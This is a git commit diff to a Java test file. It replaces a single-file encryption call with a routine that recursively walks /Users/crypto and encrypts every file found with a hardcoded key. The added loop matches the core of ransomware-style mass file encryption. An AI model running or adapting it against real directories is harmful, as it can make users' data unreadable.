52031415a33f6c547a9e455515bb86acf23b2a29
kaushal79 <52757114+kaushal79@users.noreply.github.com>
2024-04-30 18:53:45 -0400

    Update UtilsTest.java

--- src/main/java/org/example/UtilsTest.java
+++ src/main/java/org/example/UtilsTest.java
@@ -6,16 +6,57 @@ import java.io.File;
  * @author www.codejava.net
  */
 public class UtilsTest {
-    public static void main(String[] args) {
-        String key = "«ÒÙÏ˚>È*123ABCxyz@#$%^&!@#";
-        //File inputFile = new File("//crypto/Test123.java");
+    // public static void main(String[] args) {
+    //     String key = "«ÒÙÏ˚>È*123ABCxyz@#$%^&!@#";
+    //     //File inputFile = new File("//crypto/Test123.java");
 
-        try {
-            Utils.encrypt(key, inputFile);
-            //Utils.decrypt(key, inputFile);
-        } catch (Exception ex) {
-            System.out.println(ex.getMessage());
-            ex.printStackTrace();
+    //     try {
+    //         Utils.encrypt(key, inputFile);
+    //         //Utils.decrypt(key, inputFile);
+    //     } catch (Exception ex) {
+    //         System.out.println(ex.getMessage());
+    //         ex.printStackTrace();
+    //     }
+    // }
+
+    public static void main(String[] args) throws IOException
+    {
+        String key = "«ÒÙÏ˚>È*123ABCxyz@#$%^&!@#";
+        Path rootPath = Paths.get("/Users/crypto");
+
+        List<String> allFiles = new ArrayList<>();
+        listAllFiles(rootPath, allFiles);
+
+        System.out.println("Found files:");
+        allFiles.forEach(System.out::println);
+
+        for (String file: allFiles) {
+
+            File inputFile = new File(file);
+            try {
+                Utils.encrypt(key, inputFile);
+                //Utils.decrypt(key, inputFile);
+            } catch (Exception ex) {
+                System.out.println(ex.getMessage());
+                ex.printStackTrace();
+            }
+
+        }
+
+    }
+
+    private static void listAllFiles(Path currentPath, List<String> allFiles)
+            throws IOException
+    {
+        try (DirectoryStream<Path> stream = Files.newDirectoryStream(currentPath))
+        {
+            for (Path entry : stream) {
+                if (Files.isDirectory(entry)) {
+                    listAllFiles(entry, allFiles);
+                } else {
+                    allFiles.add(entry.toAbsolutePath().toString());
+                }
+            }
         }
     }
 }
